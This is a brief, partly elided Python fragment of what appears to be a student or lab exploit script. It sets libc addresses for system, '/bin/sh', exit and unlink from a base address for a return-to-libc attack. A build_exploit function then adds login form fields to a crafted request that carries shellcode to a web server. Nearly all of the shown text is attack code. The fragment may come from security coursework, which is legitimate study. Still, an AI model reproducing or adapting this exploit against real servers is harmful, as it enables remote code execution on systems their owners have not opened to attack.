...
# system
sys_addr = base_addr + 0x00041790 
# /bin/sh
sh_addr = base_addr + 0x18e363
# exit
ex_addr = base_addr + 0x000340d0 
# unlink
ul_addr = base_addr + 0x000f3e30
# dead
d_addr = 0xdeadbeef
...
def build_exploit(shellcode):
    ...
    req += ("login_username=U202112131&login_password=12131&submit_login=Login").encode('latin-1')
